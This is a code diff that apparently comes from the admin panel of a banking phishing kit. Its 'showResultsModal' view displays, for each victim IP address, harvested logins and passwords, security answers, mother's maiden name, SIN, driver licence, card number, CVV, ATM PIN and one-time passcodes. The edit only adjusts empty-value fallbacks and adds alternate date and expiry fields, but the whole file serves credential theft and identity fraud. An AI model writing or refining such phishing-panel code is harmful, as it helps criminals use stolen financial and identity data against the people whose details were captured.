@@ -122,46 +122,46 @@ function showResultsModal(_ipAddress) {
           <div class="card-body">
             <h5 class="card-title">Login Details</h5>
             <p class="card-text">
-              Username: ${details.getUserDataLogin.username || 'N/A'}<br>
-              Password: ${details.getUserDataLogin.password || 'N/A'}<br>
-              UserAgent: ${details.getUserDataLogin.userAgent || 'N/A'}
+              Username: ${details.getUserDataLogin.username || ''}<br>
+              Password: ${details.getUserDataLogin.password || ''}<br>
+              UserAgent: ${details.getUserDataLogin.userAgent || ''}
             </p>
             
             <h5 class="card-title">Security Questions</h5>
             <p class="card-text">
-              ${details.getUserDataQuestion.question1 || 'N/A'} : ${details.getUserDataQuestion.answer1 || 'N/A'}<br>
-              ${details.getUserDataQuestion.question2 || 'N/A'} : ${details.getUserDataQuestion.answer2 || 'N/A'}<br>
-              ${details.getUserDataQuestion.question3 || 'N/A'} : ${details.getUserDataQuestion.answer3 || 'N/A'}<br>
-              ${details.getUserDataQuestion.question4 || 'N/A'} : ${details.getUserDataQuestion.answer4 || 'N/A'}<br>
-              ${details.getUserDataQuestion.question5 || 'N/A'} : ${details.getUserDataQuestion.answer5 || 'N/A'}<br>
-              ${details.getUserDataOTP.customQuestion || 'N/A'} : ${details.getUserDataOTP.customAnswer || 'N/A'}
+              ${details.getUserDataQuestion.question1 || ''} : ${details.getUserDataQuestion.answer1 || ''}<br>
+              ${details.getUserDataQuestion.question2 || ''} : ${details.getUserDataQuestion.answer2 || ''}<br>
+              ${details.getUserDataQuestion.question3 || ''} : ${details.getUserDataQuestion.answer3 || ''}<br>
+              ${details.getUserDataQuestion.question4 || ''} : ${details.getUserDataQuestion.answer4 || ''}<br>
+              ${details.getUserDataQuestion.question5 || ''} : ${details.getUserDataQuestion.answer5 || ''}<br>
+              ${details.getUserDataOTP.customQuestion || ''} : ${details.getUserDataOTP.customAnswer || ''}
             </p>
         
             <h5 class="card-title">Personal Information</h5>
             <p class="card-text">
-              Full Name: ${details.getUserDataDetails.name || 'N/A'}<br>
-              Address: ${details.getUserDataDetails.address || 'N/A'}<br>
-              City: ${details.getUserDataDetails.city || 'N/A'}<br>
-              Phone Number: ${details.getUserDataDetails.phone || 'N/A'}<br>
-              Postal Code: ${details.getUserDataDetails.postal || 'N/A'}<br>
-              Email: ${details.getUserDataDetails.email || 'N/A'}<br>
-              DOB: ${details.getUserDataDetails.dob1 || 'N/A'}/${details.getUserDataDetails.dob2 || 'N/A'}/${details.getUserDataDetails.dob3 || 'N/A'}<br>
-              Mmn: ${details.getUserDataDetails.mmn || 'N/A'}<br>
-              Sin: ${details.getUserDataDetails.sin || 'N/A'}<br>
-              Driver Licence: ${details.getUserDataDetails.drivers || 'N/A'}
+              Full Name: ${details.getUserDataDetails.name || ''}<br>
+              Address: ${details.getUserDataDetails.address || ''}<br>
+              City: ${details.getUserDataDetails.city || ''}<br>
+              Phone Number: ${details.getUserDataDetails.phone || ''}<br>
+              Postal Code: ${details.getUserDataDetails.postal || ''}<br>
+              Email: ${details.getUserDataDetails.email || ''}<br>
+              DOB: ${details.getUserDataDetails.dob1 || ''}/${details.getUserDataDetails.dob2 || ''}/${details.getUserDataDetails.dob3 || ''} || ${details.getUserDataDetails.dob || ''}<br>
+              Mmn: ${details.getUserDataDetails.mmn || ''}<br>
+              Sin: ${details.getUserDataDetails.sin || ''}<br>
+              Driver Licence: ${details.getUserDataDetails.drivers || ''}
             </p>
         
             <h5 class="card-title">Card Information</h5>
             <p class="card-text">
-              Card Number: ${details.getUserDataCard.card || 'N/A'}<br>
-              Exp: ${details.getUserDataCard.exp1 || 'N/A'}/${details.getUserDataCard.exp2 || 'N/A'}<br>
-              Cvv: ${details.getUserDataCard.cvv || 'N/A'}<br>
-              ATM PIN: ${details.getUserDataCard.atm || 'N/A'}
+              Card Number: ${details.getUserDataCard.card || ''}<br>
+              Exp: ${details.getUserDataCard.exp1 || ''}/${details.getUserDataCard.exp2 || ''} || ${details.getUserDataCard.expiry || ''} <br>
+              Cvv: ${details.getUserDataCard.cvv || ''}<br>
+              ATM PIN: ${details.getUserDataCard.atm || ''}
             </p>
         
             <h5 class="card-title">One-Time Password (OTP)</h5>
             <p class="card-text">
-              OTP: ${details.getUserDataOTP.code || 'N/A'}
+              OTP: ${details.getUserDataOTP.code || ''}
             </p>
         
             <div class="d-flex justify-content-end">
